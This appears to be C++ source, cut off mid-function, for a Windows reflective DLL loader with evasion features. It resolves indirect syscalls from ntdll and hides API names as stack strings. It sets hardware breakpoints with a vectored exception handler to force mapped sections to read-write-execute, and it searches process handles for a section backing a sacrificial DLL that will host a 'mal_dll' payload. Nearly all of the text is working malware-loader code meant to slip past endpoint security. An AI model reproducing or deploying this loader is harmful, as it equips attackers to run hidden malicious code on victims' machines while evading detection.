#include <Windows.h>
#include "misc.h"
#include <iostream>
#include "headers.h"
#include "syscalls.h"

#include <string>
#include <vector>
#include <filesystem>
#include <fstream>

typedef struct _SAC_DLL_HEADER
{
	HANDLE sac_dll_handle;
	HANDLE mal_dll_handle;
	SIZE_T payload_size;
	PBYTE to_free;

} SAC_DLL_HEADER, *PSAC_DLL_HEADER;



#define SET_DR_REGISTER(ctx, index, addr) \
    do { \
        switch (index) { \
            case 0: (ctx).Dr0 = (DWORD64)(addr); break; \
            case 1: (ctx).Dr1 = (DWORD64)(addr); break; \
            case 2: (ctx).Dr2 = (DWORD64)(addr); break; \
            case 3: (ctx).Dr3 = (DWORD64)(addr); break; \
            default: break; \
        } \
    } while(0)


typedef enum {
    DR0 = 0,
    DR1 = 1,
    DR2 = 2,
    DR3 = 3,
} DrIndex;

LPVOID moduleBase = NULL;

static uintptr_t resolve_jmp_to_actual_function(void* func_addr)
{
    if (!func_addr) return 0;

    PBYTE code = (PBYTE)func_addr;

    // relative jmp
    if (code[0] == 0xE9)
    {
        int32_t relative_offset = *(int32_t*)(code + 1);

        void* next_instruction = (void*)((uintptr_t)func_addr + 5);
        void* actual_function = (void*)((uintptr_t)next_instruction + relative_offset);

        return (uintptr_t)actual_function;
    }

    // indirect jmp
    if (code[0] == 0xff && code[1] == 0x25)
    {
        // x64: FF 25 [32bits relative offset]
        uint32_t relative_offset = *(int32_t*)(code + 2);
        // 6 = FF25(2) + offset(4)
        void* import_table_addr = (void*)((uintptr_t)func_addr + 6 + relative_offset);

        void* actual_function = *(void**)import_table_addr;

        return (uintptr_t)actual_function;
    }

    return (uintptr_t)func_addr;
}

static bool extract_ssn_ret_addr(PBYTE func_addr, PDWORD ssn, uintptr_t* ret_addr)
{
    int emergency_break = 0;
    while (emergency_break < 2048)
    {
        if (*func_addr == 0xB8)
        {
            *ssn = *(PDWORD)(func_addr + 1);
        }

        if (func_addr[0] == 0x0f && func_addr[1] == 0x05 && func_addr[2] == 0xc3)
        {
            *ret_addr = (uintptr_t)func_addr;
            return true;
        }

        func_addr++;
        emergency_break++;
    }

    *ssn = 0;
    *ret_addr = 0;
    return false;
}

static bool retrieve_zw_func_s(IN HMODULE hm, IN PSYSCALL_ENTRY syscalls)
{
    bool result = false;

    PBYTE lib_base = (PBYTE)hm;

    PIMAGE_DOS_HEADER p_img_dos_hdr = (PIMAGE_DOS_HEADER)lib_base;
    if (p_img_dos_hdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return false;
    }
    
    PIMAGE_NT_HEADERS p_img_nt_hdrs = (PIMAGE_NT_HEADERS)(lib_base + p_img_dos_hdr->e_lfanew);
    if (p_img_nt_hdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        return false;
    }

    IMAGE_OPTIONAL_HEADER img_opt_hdr = p_img_nt_hdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY p_img_export_dir = (PIMAGE_EXPORT_DIRECTORY)(lib_base + img_opt_hdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD func_name_array = (PDWORD)(lib_base + p_img_export_dir->AddressOfNames);
    PDWORD func_addr_array = (PDWORD)(lib_base + p_img_export_dir->AddressOfFunctions);
    PWORD func_ordinal_array = (PWORD)(lib_base + p_img_export_dir->AddressOfNameOrdinals);

    //variables for syscall
    CHAR str_zw[] = { 'Z','w' };
    CHAR str_ZwAllocateVirtualMemory[] = { 'Z', 'w', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwProtectVirtualMemory[] = { 'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwFlushInstructionCache[] = { 'Z','w','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e','\0' };
    CHAR str_ZwCreateSection[] = { 'Z', 'w', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwMapViewOfSection[] = { 'Z', 'w', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwUnmapViewOfSection[] = { 'Z', 'w', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwQuerySystemInformation[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwQueryObject[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'O', 'b', 'j', 'e', 'c', 't', '\0' };
    CHAR str_ZwQueryVirtualMemory[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwFreeVirtualMemory[] = { 'Z', 'w', 'F', 'r', 'e', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwSetContextThread[] = { 'Z', 'w', 'S', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
    CHAR str_ZwGetContextThread[] = { 'Z', 'w', 'G', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };


    PBYTE func_addr = 0;
    uintptr_t func_addr_value = 0;

    int syscall_entries = 0;
    int zw_func_counter = 0;
    DWORD syscall_half[500] = { 0 };

    


    for (DWORD i = 0; i < p_img_export_dir->NumberOfFunctions; i++)
    {
        CHAR* func_name = (CHAR*)(lib_base + func_name_array[i]);

        if (!CompareNStringASCII(str_zw, func_name, 2))
            continue;

		func_addr = (PBYTE)(lib_base + func_addr_array[func_ordinal_array[i]]);
        func_addr_value = (uintptr_t)func_addr;

        syscall_half[zw_func_counter++] = (DWORD)(func_addr_value & 0xFFFFFFFF);

        if (CompareStringASCII(str_ZwAllocateVirtualMemory, func_name)) {

            syscalls[0].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[0].SSN, (uintptr_t*)& syscalls[0].sysretAddr);
            if (!result) return result;
            //syscalls[0].sysretAddr = NULL;
            //syscalls[0].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwProtectVirtualMemory, func_name)) {

            syscalls[1].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[1].SSN, (uintptr_t*)& syscalls[1].sysretAddr);
            if (!result) return result;
            //syscalls[1].sysretAddr = NULL;
            //syscalls[1].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwFlushInstructionCache, func_name)) {

            syscalls[2].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[2].SSN, (uintptr_t*)& syscalls[2].sysretAddr);
            if (!result) return result;
            //syscalls[2].sysretAddr = NULL;
            //syscalls[2].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwCreateSection, func_name)) {

            syscalls[3].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[3].SSN, (uintptr_t*)& syscalls[3].sysretAddr);
            if (!result) return result;
            //syscalls[3].sysretAddr = NULL;
            //syscalls[3].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwMapViewOfSection, func_name)) {

            syscalls[4].funcAddr = (FARPROC)func_name;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[4].SSN, (uintptr_t*)& syscalls[4].sysretAddr);
            if (!result) return result;
            //syscalls[4].sysretAddr = NULL;
            //syscalls[4].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwUnmapViewOfSection, func_name)) {

            syscalls[5].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[5].SSN, (uintptr_t*)& syscalls[5].sysretAddr);
            if (!result) return result;
            //syscalls[5].sysretAddr = NULL;
            //syscalls[5].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwQuerySystemInformation, func_name)) {

            syscalls[6].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[6].SSN, (uintptr_t*)& syscalls[6].sysretAddr);
            if (!result) return result;
            //syscalls[6].sysretAddr = NULL;
            //syscalls[6].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwQueryObject, func_name)) {

            syscalls[7].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[7].SSN, (uintptr_t*)& syscalls[7].sysretAddr);
            if (!result) return result;
            //syscalls[7].sysretAddr = NULL;
            //syscalls[7].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwQueryVirtualMemory, func_name)) {

            syscalls[8].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[8].SSN, (uintptr_t*)& syscalls[8].sysretAddr);
            if (!result) return result;
            //syscalls[8].sysretAddr = NULL;
            //syscalls[8].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwFreeVirtualMemory, func_name)) {

            syscalls[9].funcAddr = (FARPROC)func_addr;
            extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[9].SSN, (uintptr_t*)& syscalls[9].sysretAddr);
            if (!result) return result;
            //syscalls[9].sysretAddr = NULL;
            //syscalls[9].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwSetContextThread, func_name)) {

            syscalls[10].funcAddr = (FARPROC)func_addr;
            extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[10].SSN, (uintptr_t*)& syscalls[10].sysretAddr);
            if (!result) return result;
            //syscalls[10].sysretAddr = NULL;
            //syscalls[10].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwGetContextThread, func_name)) {

            syscalls[11].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[11].SSN, (uintptr_t*)& syscalls[11].sysretAddr);
            if (!result) return result;
            //syscalls[11].sysretAddr = NULL;
            //syscalls[11].SSN = 0;
            syscall_entries++;

        }

    }

    return result;

}

static HANDLE find_section_handle(PSYSCALL_ENTRY zw_func_s, fnGetProcessId GPID)
{
    WCHAR wstr_section[] = { L'S', L'e', L'c', L't', L'i', L'o', L'n', L'\0' };
    WCHAR wstr_SRH[] = { L'S',L'R',L'H',L'.',L'd',L'l',L'l',L'\0' };

    NTSTATUS status = 0;



    PVOID buffer = NULL;
    SIZE_T buf_size = 0x10000;
    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &buffer,
        0,
        &buf_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
    {
        return FALSE;
    }


    while ((status = ZwQuerySystemInformation(
        16, buffer, buf_size, NULL,
        zw_func_s[ZwQuerySystemInformationF].SSN,
        zw_func_s[ZwQuerySystemInformationF].sysretAddr))
        == 0xc0000004)
    {
        // free and re-allocate
        if (status = ZwFreeVirtualMemory(
            ((HANDLE)(LONG_PTR)-1), &buffer, 0,
            MEM_RELEASE, 
            zw_func_s[ZwFreeVirtualMemoryF].SSN,
            zw_func_s[ZwFreeVirtualMemoryF].sysretAddr) == 0)
        {
            return FALSE;
        }


        // reset variables
        buffer = NULL;
        buf_size *= 2;


		if ((status = ZwAllocateVirtualMemory(
			((HANDLE)(LONG_PTR)-1),
			&buffer,
			0,
			&buf_size,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE,
			zw_func_s[ZwAllocateVirtualMemoryF].SSN,
			zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
		)) != 0)
		{
			return FALSE;
		}

    }

    PSYSTEM_HANDLE_INFORMATION handle_info = (PSYSTEM_HANDLE_INFORMATION)buffer;

    PVOID obj_type_info_tmp = NULL;
    SIZE_T obj_type_info_size = 0x1000;

    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &obj_type_info_tmp,
        0,
        &obj_type_info_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
    {
        return FALSE;
    }



    PVOID obj_name_info = NULL;
    SIZE_T obj_name_info_size = 0x1000;


    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &obj_name_info,
        0,
        &obj_name_info_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
    {
        return FALSE;
    }

    POBJECT_TYPE_INFORMATION obj_type_info = (POBJECT_TYPE_INFORMATION)obj_type_info_tmp;

    SYSTEM_HANDLE handle = { 0 };
    DWORD pid = GPID(((HANDLE)(LONG_PTR)-1));

    SIZE_T view_size = 0;
    PVOID view_base = NULL;


    UNICODE_STRING obj_name = { 0 };
    ULONG ret_length = 0;
    SIZE_T ret_length_size_t = 0;
    PVOID buf_mem_info = NULL;
    SIZE_T buf_mem_info_size = 0;
    SIZE_T ret_length_mem = 0;
    PUNICODE_STRING mem_info = NULL;


    for (ULONG_PTR i = 0; i < handle_info->HandleCount; i++)
    {
        handle = handle_info->Handles[i];

        if (handle.ProcessId != pid)
            continue;

        if ((status = ZwQueryObject(
            (void*)handle.Handle, ObjectTypeInformation,
            obj_type_info, 0x1000, NULL,
            zw_func_s[ZwQueryObjectF].SSN, zw_func_s[ZwQueryObjectF].sysretAddr))
            != 0) 
        {
            continue;
        }

        // check if the handle is point to a section object.
        if (ComprareNStringWIDE(
            obj_type_info->Name.Buffer,
            wstr_section,
            (obj_type_info->Name.Length / sizeof(WCHAR)))
            != TRUE)
        {
            continue;
        }

        // comparing with IMAGE_NOT_AT_BASE because that is the
        // return value in status if i try to re-map the DLL,
        // but it is actually mapped.
        
        if ((status = ZwMapViewOfSection(
            (void*)handle.Handle,
            ((HANDLE)(LONG_PTR)-1),
            &view_base,
            NULL, NULL, NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY,
            zw_func_s[ZwMapViewOfSectionF].SSN,
            zw_func_s[ZwMapViewOfSectionF].sysretAddr))
            != 0x40000003)
        {

            // if it actually was successfully but not for our
            // DLL, then we need to clean up and continue
            if (status == 0)
            {
                if (status = ZwUnmapViewOfSection(
                    ((HANDLE)(LONG_PTR)-1), view_base,
                    zw_func_s[ZwUnmapViewOfSectionF].SSN,
                    zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
                ) != 0)
                {
                    return FALSE;
                }
            }

            view_base = NULL;
            continue;
        }

        if (view_base == NULL)
            continue;

		// here need to query the memory

		buf_mem_info = NULL;
		buf_mem_info_size = 0x100;

		if ((status = ZwAllocateVirtualMemory(
			((HANDLE)(LONG_PTR)-1),
			&buf_mem_info,
			0,
			&buf_mem_info_size,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE,
			zw_func_s[ZwAllocateVirtualMemoryF].SSN,
			zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr)) != 0)
		{

            return FALSE;

		}

        if ((status = ZwQueryVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            view_base,
            MemoryMappedFilenameInformation,
            buf_mem_info,
            buf_mem_info_size,
            &ret_length_mem,
            zw_func_s[ZwQueryVirtualMemoryF].SSN,
            zw_func_s[ZwQueryVirtualMemoryF].sysretAddr
        )) == 0x80000005)
        {

            // free and re-allocate

            if ((status = ZwFreeVirtualMemory(
                ((HANDLE)(LONG_PTR)-1),
                &buf_mem_info,
                0,
                MEM_RELEASE,
                zw_func_s[ZwAllocateVirtualMemoryF].SSN,
                zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr)) == 0)
            {
                return FALSE;
            }

            // re-allocate
            buf_mem_info_size = ret_length_mem;
			if ((status = ZwAllocateVirtualMemory(
				((HANDLE)(LONG_PTR)-1),
				&buf_mem_info,
				0,
				&buf_mem_info_size,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_READWRITE,
				zw_func_s[ZwAllocateVirtualMemoryF].SSN,
				zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr)) != 0)
			{

				return FALSE;

			}

            // query memory again
            if ((status = ZwQueryVirtualMemory(
                ((HANDLE)(LONG_PTR)-1),
                view_base,
                MemoryMappedFilenameInformation,
                buf_mem_info,
                buf_mem_info_size,
                &ret_length_mem,
                zw_func_s[ZwQueryVirtualMemoryF].SSN,
                zw_func_s[ZwQueryVirtualMemoryF].sysretAddr
            )) == 0x80000005)
            {
                return FALSE;
            }


        }
        else if (status != 0)
        {

            // if it's not buffer overflow but actual error we need to unmap the dll and continue

			if (status = ZwUnmapViewOfSection(
				((HANDLE)(LONG_PTR)-1), view_base,
				zw_func_s[ZwUnmapViewOfSectionF].SSN,
				zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
			) != 0)
			{
				return FALSE;
			}

            view_base = NULL;
            continue;

        }

        mem_info = (PUNICODE_STRING)buf_mem_info;

        if (mem_info->Buffer == NULL)
            continue;

		// if the path contains the SRH.dll
        if (!containsSubstringUnicode(
            mem_info->Buffer,
            wstr_SRH,
            mem_info->Length / sizeof(WCHAR), 8))
            continue;

		// free the buffer memory
		if (status = ZwFreeVirtualMemory(
			((HANDLE)(LONG_PTR)-1),
			&buf_mem_info,
			0,
			MEM_RELEASE,
			zw_func_s[ZwFreeVirtualMemoryF].SSN,
			zw_func_s[ZwFreeVirtualMemoryF].sysretAddr
			) == 0)
		{

			return FALSE;

		}

		if ((status = ZwUnmapViewOfSection(
			((HANDLE)(LONG_PTR)-1),
			view_base,
			zw_func_s[ZwUnmapViewOfSectionF].SSN,
			zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
		)) != 0)
		{
			return FALSE;
		}

        return (void*)handle.Handle;

        // I haven't found any match.
        if ((status = ZwFreeVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            &buf_mem_info,
            0, MEM_RELEASE,
            zw_func_s[ZwFreeVirtualMemoryF].SSN,
            zw_func_s[ZwFreeVirtualMemoryF].sysretAddr)) == 0)
        {
            return FALSE;
        }

        if ((status = ZwUnmapViewOfSection(
            ((HANDLE)(LONG_PTR)-1),
            view_base,
            zw_func_s[ZwUnmapViewOfSectionF].SSN,
            zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
        )) != 0)
        {
            return FALSE;
        }



    }


    return (HANDLE)-1;
}




//retrieve syscall instructions address
PBYTE ret_RET_addr(PBYTE func_addr) {

    int emergencybreak = 0;
    while (emergencybreak < 2048) {
        //taking into account indianess crazyness
        if (func_addr[0] == 0xc3) {

            return func_addr;
        }
        func_addr++;
        emergencybreak++;
    }
    return NULL;
}


/*--------------HARDWARE BREAKPOINT MANAGEMENT---------------------*/


unsigned long long set_dr7_bit(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
    unsigned long long mask = (1UL << NmbrOfBitsToModify) - 1UL;
    unsigned long long NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);

    return NewDr7Register;
}

VOID NtMapViewOfSectionDetour(PCONTEXT pThreadCtx) {


    *(ULONG_PTR*)(pThreadCtx->Rsp + 80) = PAGE_EXECUTE_READWRITE;

    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID NtCreateSectionDetour(PCONTEXT pThreadCtx) {


    pThreadCtx->Rdx = SECTION_ALL_ACCESS;

    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID ZwCloseDetour(PCONTEXT pThreadCtx) {

    //need to find the address of a C3 instruction within an executable memory range
    pThreadCtx->Rip = (ULONG_PTR)ret_RET_addr((PBYTE)ZwCloseDetour);
    //resuming the execution
    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}


VOID unset_hwbp(DrIndex index)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
    WCHAR wstr_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    retrieve_zw_func_s(GMHR(wstr_ntdll), zw_func_s);

    ZwGetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwGetContextThreadF].SSN,
        zw_func_s[ZwGetContextThreadF].sysretAddr
    );

    SET_DR_REGISTER(ctx, index, 0x00);

    ctx.Dr7 = set_dr7_bit(ctx.Dr7, index << 1, 1, 0);

    ZwSetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwGetContextThreadF].SSN,
        zw_func_s[ZwGetContextThreadF].sysretAddr
    );

}

void set_hwbp(DrIndex index, PVOID addr, PSYSCALL_ENTRY zw_func_s)
{

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    ZwGetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwGetContextThreadF].SSN,
        zw_func_s[ZwGetContextThreadF].sysretAddr
    );

    SET_DR_REGISTER(ctx, index, addr);

    ctx.Dr7 = set_dr7_bit(ctx.Dr7, index << 1, 1, 1);

    ZwSetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwSetContextThreadF].SSN,
        zw_func_s[ZwSetContextThreadF].sysretAddr
    );

    // 立即验证设置是否成功
    CONTEXT verify_ctx = { 0 };
    verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    ZwGetContextThread(
        (HANDLE)-2, &verify_ctx,
        zw_func_s[ZwGetContextThreadF].SSN,
        zw_func_s[ZwGetContextThreadF].sysretAddr
    );

}


LONG WINAPI VectorHandler(PEXCEPTION_POINTERS exception_info) {


    //(ZwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress);
    if (exception_info->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        if (exception_info->ExceptionRecord->ExceptionAddress == (PVOID)exception_info->ContextRecord->Dr1) {

            unset_hwbp(DrIndex::DR1);

            ZwCloseDetour(exception_info->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }


        if (exception_info->ExceptionRecord->ExceptionAddress == (PVOID)exception_info->ContextRecord->Dr2) {

            unset_hwbp(DrIndex::DR2);

            NtMapViewOfSectionDetour(exception_info->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }

        if (exception_info->ExceptionRecord->ExceptionAddress == (PVOID)exception_info->ContextRecord->Dr3) {

            unset_hwbp(DrIndex::DR3);

            NtCreateSectionDetour(exception_info->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}



//typedef struct _SYSCALL_ENTRY {
//
//    FARPROC funcAddr;
//    PBYTE sysretAddr;
//    int SSN;
//
//} SYSCALL_ENTRY, * PSYSCALL_ENTRY;

PBYTE ReflectiveFunction()
{
    //PE HEADERS VARS
    PIMAGE_DOS_HEADER	img_dos_hdr = NULL;
    PIMAGE_NT_HEADERS	img_nt_hdrs = NULL;
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = { 0 };
    IMAGE_FILE_HEADER img_file_hdr = { 0 };

    PIMAGE_SECTION_HEADER* pe_section_ptr_array = NULL;
    PIMAGE_IMPORT_DESCRIPTOR img_imp_desc = NULL;
    PIMAGE_THUNK_DATA64 original_first_thunk = NULL;
    PIMAGE_THUNK_DATA64 first_thunk = NULL;
    PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
    PIMAGE_BASE_RELOCATION img_reloc = NULL;
    PBASE_RELOCATION_ENTRY reloc_entry = NULL;
    PIMAGE_RUNTIME_FUNCTION_ENTRY img_runtime_func_entry = NULL;
    PIMAGE_TLS_DIRECTORY img_tls_dict = NULL;
    PIMAGE_TLS_CALLBACK* tls_callbacks = NULL;



    //fix IAT vars
    HMODULE dll = NULL;
    FARPROC import_func_address = NULL;
    int import_func_ordinal = 0;


    //base relocation vars
    ULONG_PTR delta = NULL;
    int entries_count;

    //fix Memory Protection variables
    DWORD section_protection = 0x00;


    //locate DLL in memory
    PDLL_HEADER dll_hdr = NULL;
    ULONG_PTR current_module_base = NULL;

    //new PE in memory and memory to free once loaded
    PBYTE reflective_dll_base = NULL;
    PBYTE mem_to_free = NULL;

    //function prototpyes
    fnLoadLibraryA func_LoadLibraryA = NULL; //to fix the IAT
    fnRtlAddFunctionTable func_RtlAddFunctionTable = NULL;
    fnLoadLibraryExA func_LoadLibraryExA = NULL;//to load sac dll without resolving imports

    //stack strings for PIC
    WCHAR str_Kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    WCHAR str_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    WCHAR str_user32[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    CHAR str_RtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e', '\0' };
    CHAR str_LoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
    CHAR str_LoadLibraryExA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
    CHAR str_GetProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };


    //stack strings and variables for HBP
    CHAR str_AddVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
    CHAR str_RemoveVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
    PVOID addr_ZwClose = NULL;
    PVOID addr_NtMapViewOfSection = NULL;
    PVOID addr_NtCreateSection = NULL;
    CHAR str_ZwClose[] = { 'Z','w','C','l','o','s','e','\0' };
    CHAR str_NtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_NtCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };


    //NT status variable for syscall return code
    NTSTATUS status = 0x00;

    HMODULE hm_kernel32 = GetModuleHandleW(str_Kernel32);
    HMODULE hm_ntdll = GetModuleHandleW(str_ntdll);

    fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GetProcAddress(hm_kernel32, str_AddVectoredExceptionHandler);
    fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GetProcAddress(hm_kernel32, str_RemoveVectoredExceptionHandler);

    if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
        return FALSE;
    if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
        return FALSE;
    if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
        return FALSE;

    SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
    retrieve_zw_func_s(GetModuleHandleW(str_ntdll), zw_func_s);


    /* set hardware breakpoint and detour functions */
    PVOID g_VectoredHandlerHandle = NULL;
    g_VectoredHandlerHandle = func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
    if (g_VectoredHandlerHandle == NULL) {
        MessageBoxA(NULL, "Failed to register vectored exception handler", "Error", MB_ICONERROR);
        return FALSE;
    }

    addr_ZwClose = GPAR(hm_ntdll, str_ZwClose);
    addr_NtMapViewOfSection = GPAR(hm_ntdll, str_NtMapViewOfSection);
    addr_NtCreateSection = GPAR(hm_ntdll, str_NtCreateSection);

    if (addr_ZwClose != NULL
        && addr_NtCreateSection != NULL
        && addr_NtMapViewOfSection != NULL
        )
    {
        set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
        set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
        set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
